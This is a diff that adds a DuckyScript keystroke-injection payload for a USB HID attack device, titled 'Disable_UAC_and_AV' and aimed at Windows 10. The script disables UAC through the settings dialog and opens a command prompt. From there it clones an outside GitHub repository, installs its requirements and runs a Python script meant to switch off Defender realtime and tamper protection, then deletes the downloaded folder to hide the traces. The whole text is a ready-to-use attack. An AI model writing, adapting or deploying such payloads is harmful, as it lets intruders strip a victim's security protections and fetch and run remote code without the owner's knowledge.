@@ -1,0 +1,64 @@
+REM Title:         Disable_UAC_and_AV
+REM Description    Disable UAC and download py script to disable Realtime and tamper protection
+REM Author:        FX17
+REM Version:       1.0
+REM Target:        Windows 10
+REM Attackmodes:   HID
+
+DELAY 1000
+REM Disable UAC
+GUI d
+DELAY 500
+CTRL ESC
+DELAY 1000
+STRING uac
+DELAY 500
+ENTER
+DELAY 500
+TAB
+DELAY 500
+DOWN
+DOWN
+DOWN
+TAB
+ENTER
+DELAY 500
+ALT y
+
+REM Open CMD
+DELAY 5000
+GUI r
+DELAY 1000
+STRING cmd
+ENTER
+DELAY 1000
+STRING cd Documents
+ENTER
+DELAY 500
+REM Install the "Virus" to disable AV
+STRING git clone https://github.com/Keiranos/AVDeact
+ENTER
+DELAY 1000
+STRING cd AVDeact
+ENTER
+DELAY 500
+STRING py -m pip install -r requirements.txt
+ENTER
+DELAY 15000
+STRING py main.py
+ENTER
+DELAY 20000
+ALT F4
+
+REM Delete the "virus" and close cmd
+DELAY 500
+STRING cd ..
+ENTER
+DELAY 500
+STRING rmdir /s .\AVDeact
+ENTER
+DELAY 500
+STRING Y
+ENTER
+DELAY 500
+ALT F4
